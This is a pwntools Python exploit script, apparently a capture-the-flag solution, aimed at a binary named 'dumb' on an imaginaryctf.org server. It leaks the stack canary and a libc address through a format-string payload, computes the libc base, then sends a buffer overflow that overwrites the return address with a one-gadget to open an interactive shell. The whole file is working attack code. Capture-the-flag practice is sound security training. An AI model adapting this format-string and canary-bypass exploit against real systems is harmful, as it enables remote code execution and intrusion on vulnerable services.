from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("./libc-2.27.so")

# io = process("./dumb")
io = remote("puzzler7.imaginaryctf.org", 7777)
# io = gdb.debug("./dumb", "b *(run + 285)\nc")
io.sendlineafter(b"leave?\n", b"c8763")
io.sendlineafter(b"with?\n", b"a" * 16 + b"%27$p,%23$p")
io.recvline()
canary, puts = [int(h, 16) for h in io.recvlineS().strip().split(",")]
puts -= 418
print(f"{canary = :#x}")
print(f"{puts = :#x}")
libc_base = puts - libc.sym["puts"]
print(f"{libc_base = :#x}")
gadget = libc_base + 0x4F365
print(f"{gadget = :#x}")
io.sendlineafter(b"[y/n]", b"n")
io.sendlineafter(b"leave?\n", b"a" * 136 + p64(canary) + p64(0) + p64(gadget))
io.sendlineafter(b"with?\n", b"c8763")
io.sendlineafter(b"[y/n]", b"y")
io.interactive()
